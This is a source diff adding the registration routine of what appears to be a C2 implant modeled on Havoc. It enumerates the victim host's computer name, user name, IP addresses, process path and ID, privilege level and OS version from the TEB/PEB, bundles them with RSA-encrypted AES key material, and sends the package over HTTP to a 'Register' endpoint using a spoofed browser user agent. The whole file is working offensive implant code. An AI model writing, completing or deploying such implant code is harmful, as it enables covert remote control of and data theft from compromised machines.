@@ -1,0 +1,163 @@
+#include "agent.h"
+#include "package.h"
+#include "enum.h"
+#include "http.h"
+#include "localcstd.h"
+/*
+
+Taken from havoc as a basic model.
+     Unencrypted Header (if specified):
+        [ SIZE         ] 4 bytes
+        [ Magic Value  ] 4 bytes
+        [ Agent ID     ] 4 bytes
+        [ COMMAND ID   ] 4 bytes
+        [ Request ID   ] 4 bytes
+
+     Encrypted Using RSA MetaData:
+        [ Encrypted AES KEY ] 0x100 bytes
+        [ Encrypted AES IV  ] 0x100 bytes
+
+     Encrypted MetaData:
+
+        [ Magic Value  ] 4 bytes
+        [ Demon ID     ] 4 bytes
+        [ Host Name    ] size + bytes
+        [ User Name    ] size + bytes
+        [ Domain       ] size + bytes
+        [ IP Address   ] 16 bytes?
+        [ Process Name ] size + bytes
+        [ Process ID   ] 4 bytes
+        [ Parent  PID  ] 4 bytes
+        [ Process Arch ] 4 bytes
+        [ Elevated     ] 4 bytes
+        [ Base Address ] 8 bytes
+        [ OS Info      ] ( 5 * 4 ) bytes
+        [ OS Arch      ] 4 bytes
+        [ SleepDelay   ] 4 bytes
+        [ SleepJitter  ] 4 bytes
+        [ Killdate     ] 8 bytes
+        [ WorkingHours ] 4 bytes
+        ..... more
+        [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
+
+        */
+
+
+//TODO: BIG VERY IMPORTANT. add all the data to the pPack variable. Name it metadata. Then add it to the agent packages list and send it off.
+INT RegisterAgent(pAgent agent) {
+    INT err;
+    pPackage pPack;
+
+    if ((pPack = CreatePackageWithMetaData(INITIALIZE_AGENT, &agent)) == NULL) {
+        printf("[error] attempting to create package\n");
+        return -1;
+    }
+    //add package to agentData.
+    agent->packages = pPack;
+    AddPackageToAgentPackageList(agent, pPack);
+
+
+    if ((err = AddBytesToPackage(agent->packages, agent->EncryptedAESKey, agent->EncryptedAESKeySize)) != PACKAGE_SUCCESS)
+    {
+        printf("[error] attempting to add aes key to package\n");
+        return -1;
+    }
+
+    if ((err = AddBytesToPackage(agent->packages, agent->EncryptedIV, agent->EncryptedIVSize)) != PACKAGE_SUCCESS)
+    {
+        printf("[error] attempting to add aes key to package\n");
+        return -1;
+    }
+
+    if(!Enumerate(agent)) {
+		printf("[error] attempting to enumerate\n");
+		return -1;
+	}
+    if((err = AddInt32ToPackage(agent->packages, AGENT_MAGIC_VALUE)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add magic value to package\n");
+        return -1;
+    }
+    if ((err = AddInt32ToPackage(agent->packages, agent->AgentID)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add agent id to package\n");
+        return -1;
+    }
+    if((err = AddStringToPackage(agent->packages, agent->Context->ComputerName)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add computer name to package\n");
+		return -1;
+	}
+    if((err = AddStringToPackage(agent->packages, agent->Context->UserName)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add user name to package\n");
+        return -1;
+    }
+
+    for(int i = 0; i < GetLPSTRArraySize(agent->Context->IPAddress); i++) {
+		if((err = AddStringToPackage(agent->packages, agent->Context->IPAddress[i])) != PACKAGE_SUCCESS) {
+			printf("[error] attempting to add ip address to package\n");
+			return -1;
+		}
+	}
+    if((err = AddStringToPackage(agent->packages, (  (PRTL_USER_PROCESS_PARAMETERS ) agent->pTeb->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Buffer ) ) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add computer name to package\n");
+		return -1;
+	}
+    if ((err = AddInt32ToPackage(agent->packages, (DWORD)(ULONG_PTR) agent->pTeb->ClientId.UniqueProcess)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add process id to package\n");
+        return -1;
+    }
+    if ((err = AddInt32ToPackage(agent->packages, (DWORD)(ULONG_PTR)agent->pTeb->ClientId.UniqueThread)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add parent process id to package\n");
+        return -1;
+    }
+    if((err = AddInt32ToPackage(agent->packages, agent->Context->Process_Arch)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add platform id to package\n");
+		return -1;
+	}
+    if ((err = AddInt32ToPackage(agent->packages, agent->Context->Elevated)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add elevated to package\n");
+        return -1;
+    }
+    if ((err = AddInt32ToPackage(agent->packages, agent->Context->dwMajorVersion)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add major version to package\n");
+        return -1;
+    }
+    if ((err = AddInt32ToPackage(agent->packages, agent->Context->dwMinorVersion)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add minor version to package\n");
+		return -1;
+	}
+    if ((err = AddInt32ToPackage(agent->packages, agent->Context->wProductType)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add product type number to package\n");
+		return -1;
+	}
+    if ((err = AddInt32ToPackage(agent->packages, agent->Context->wServicePackMajor)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add service pack number to package\n");
+        return -1;
+    }
+    if ((err = AddInt32ToPackage(agent->packages, agent->Context->dwBuildNumber)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add build number to package\n");
+        return -1;
+    }
+    if ((err = AddInt32ToPackage(agent->packages, agent->Context->OS_Arch)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add os arch to package\n");
+        return -1;
+    }
+
+    PackageSendMetaDataPackage(agent->packages, NULL, NULL, agent);
+
+    return err;
+}
+
+BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength) {
+    Agent	new_agent = { 0 };
+    LPCWSTR UserAgent = L"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1";
+    LPCWSTR HttpEndpoint = L"Register";
+    LPCWSTR HttpServer = L"127.0.0.1";
+    LPCWSTR RequestHeaders = L"Content-Type: application/x-www-form-urlencoded";
+
+
+
+
+
+    PerformRequest(agent, UserAgent, HttpEndpoint, HttpServer, Buffer, BufferLength, RequestHeaders);
+
+    return 1;
+}
